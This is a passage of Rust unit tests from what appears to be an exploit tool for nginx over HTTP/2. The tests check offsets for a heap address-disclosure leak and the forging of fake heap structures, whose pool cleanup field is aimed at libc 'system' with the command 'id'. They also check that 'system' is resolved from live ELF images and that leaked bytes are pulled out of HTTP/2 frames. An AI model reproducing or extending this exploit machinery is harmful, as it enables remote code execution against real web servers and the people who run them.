            locate_copy_filter_context(&disclosure, request_offset, &profile).unwrap();
        assert_eq!(context_offset, 4000);
        assert_eq!(index, 100);
    }

    #[test]
    fn forged_holder_places_writer_and_chain() {
        let (disclosure, profile, holder, nginx, _libc, segments, _r, _s) = disclosure_fixture();
        let (value, adaptive) = forge_address_disclosure(
            &disclosure,
            &profile,
            holder,
            nginx,
            &segments,
            7,
            b"id",
        )
        .unwrap();
        assert_eq!(u64_at(&value, 0), nginx);
        assert_eq!(u64_at(&value, 8), holder + profile.heap.address_disclosure.as_ref().unwrap().holder_offsets.request as u64);
        assert_eq!(u64_at(&value, profile.heap.address_disclosure.as_ref().unwrap().holder_offsets.node), 7);
        assert_eq!(adaptive.len(), profile.heap.adaptive_value_bytes);
        assert_eq!(
            u64_at(&adaptive, adaptive.len() - profile.heap.pool_stub_bytes + profile.heap.pool_field_offsets.cleanup),
            holder
        );
    }

    #[test]
    fn resolves_system_from_live_elf_bytes() {
        let (base, image) = minimal_elf();
        let (system, runtime_base) =
            resolve_elf64_symbol(&[(base, image)], "system").unwrap();
        assert_eq!(runtime_base, base);
        assert_eq!(system, base + 0x900);
    }

    #[test]
    fn extraction_requires_one_chain() {
        let mut raw = Vec::new();
        raw.extend_from_slice(&crate::h2::frame(DATA, 0, 9, &vec![b'a'; 5]));
        raw.extend_from_slice(&crate::h2::frame(DATA, END_STREAM, 9, &vec![b'b'; 3]));
        assert_eq!(extract_disclosure(&raw, 9, &[5, 3]).unwrap(), b"aaaaabbb".to_vec());
        assert!(extract_disclosure(&raw, 9, &[5, 4]).is_err());
        assert_eq!(extract_data_body(&raw, 9, 8).unwrap(), b"aaaaabbb".to_vec());
    }
}
